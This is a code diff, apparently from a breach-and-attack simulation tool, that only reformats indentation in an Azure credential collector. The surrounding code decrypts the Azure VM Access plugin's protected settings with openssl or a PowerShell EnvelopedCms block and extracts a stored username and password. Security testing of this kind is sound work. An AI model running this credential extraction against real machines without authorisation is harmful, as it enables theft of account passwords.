@@ -57,12 +57,12 @@ class AzureCollector(object):
             base64_command = """openssl base64 -d -a"""
             priv_path = os.path.join(linux_cert_store, "%s.prv" % cert_thumbprint)
             b64_proc = subprocess.Popen(
-                    base64_command.split(), stdin=subprocess.PIPE, stdout=subprocess.PIPE
+                base64_command.split(), stdin=subprocess.PIPE, stdout=subprocess.PIPE
             )
             b64_result = b64_proc.communicate(input=protected_data + "\n")[0]
             decrypt_command = "openssl smime -inform DER -decrypt -inkey %s" % priv_path
             decrypt_proc = subprocess.Popen(
-                    decrypt_command.split(), stdout=subprocess.PIPE, stdin=subprocess.PIPE
+                decrypt_command.split(), stdout=subprocess.PIPE, stdin=subprocess.PIPE
             )
             decrypt_raw = decrypt_proc.communicate(input=b64_result)[0]
             decrypt_data = json.loads(decrypt_raw)
@@ -77,7 +77,7 @@ class AzureCollector(object):
             return None
         except subprocess.CalledProcessError:
             LOG.warning(
-                    "Failed to decrypt VM Access plugin file. Failed to decode B64 and decrypt data"
+                "Failed to decrypt VM Access plugin file. Failed to decode B64 and decrypt data"
             )
             return None
 
@@ -96,20 +96,20 @@ class AzureCollector(object):
             ]
             # we're going to do as much of this in PS as we can.
             ps_block = ";\n".join(
-                    [
-                        '[System.Reflection.Assembly]::LoadWithPartialName("System.Security") | '
-                        "Out-Null",
-                        '$base64 = "%s"' % protected_data,
-                        "$content = [Convert]::FromBase64String($base64)",
-                        "$env = New-Object Security.Cryptography.Pkcs.EnvelopedCms",
-                        "$env.Decode($content)",
-                        "$env.Decrypt()",
-                        "$utf8content = [text.encoding]::UTF8.getstring($env.ContentInfo.Content)",
-                        "Write-Host $utf8content",  # we want to simplify parsing
-                    ]
+                [
+                    '[System.Reflection.Assembly]::LoadWithPartialName("System.Security") | '
+                    "Out-Null",
+                    '$base64 = "%s"' % protected_data,
+                    "$content = [Convert]::FromBase64String($base64)",
+                    "$env = New-Object Security.Cryptography.Pkcs.EnvelopedCms",
+                    "$env.Decode($content)",
+                    "$env.Decrypt()",
+                    "$utf8content = [text.encoding]::UTF8.getstring($env.ContentInfo.Content)",
+                    "Write-Host $utf8content",  # we want to simplify parsing
+                ]
             )
             ps_proc = subprocess.Popen(
-                    ["powershell.exe", "-NoLogo"], stdin=subprocess.PIPE, stdout=subprocess.PIPE
+                ["powershell.exe", "-NoLogo"], stdin=subprocess.PIPE, stdout=subprocess.PIPE
             )
             ps_out = ps_proc.communicate(ps_block)[0]
             # this is disgusting but the alternative is writing the file to disk...
@@ -117,7 +117,7 @@ class AzureCollector(object):
             password = json.loads(password_raw)["Password"]
             T1005Telem(ScanStatus.USED, "Azure credentials", "Path: %s" % filepath).send()
             T1064Telem(
-                    ScanStatus.USED, "Powershell scripts used to extract azure credentials."
+                ScanStatus.USED, "Powershell scripts used to extract azure credentials."
             ).send()
             return username, password
         except IOError:
@@ -128,6 +128,6 @@ class AzureCollector(object):
             return None
         except subprocess.CalledProcessError:
             LOG.warning(
-                    "Failed to decrypt VM Access plugin file. Failed to decode B64 and decrypt data"
+                "Failed to decrypt VM Access plugin file. Failed to decode B64 and decrypt data"
             )
             return None
